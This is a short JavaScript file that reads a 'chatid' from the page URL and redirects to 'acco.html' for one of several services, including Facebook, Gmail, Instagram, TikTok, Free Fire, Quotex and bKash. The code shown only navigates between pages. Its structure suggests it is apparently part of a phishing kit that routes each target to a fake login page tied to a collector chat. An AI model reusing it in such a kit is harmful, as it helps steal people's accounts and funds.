const urlParams = new URLSearchParams(window.location.search);
const chatid = urlParams.get('id');

function gotofacebook() {
window.location.href = 'acco.html?account=facebook&id=' + chatid;
}

function gotogmail() {
window.location.href = 'acco.html?account=gmail&id=' + chatid;
}

function gotoinstagram() {
window.location.href = 'acco.html?account=instagram&id=' + chatid;
}

function gototiktok() {
window.location.href = 'acco.html?account=tiktok&id=' + chatid;
}

function gotofreefire() {
window.location.href = 'acco.html?account=freefire&id=' + chatid;
}

function gototwitter() {
window.location.href = 'acco.html?account=twitter&id=' + chatid;
}

function gotoquotex() {
window.location.href = 'acco.html?account=quotex&id=' + chatid;
}

function gotobkash() {
window.location.href = 'acco.html?account=bkash&id=' + chatid;
}

function backtoindex() {
  window.history.back();
}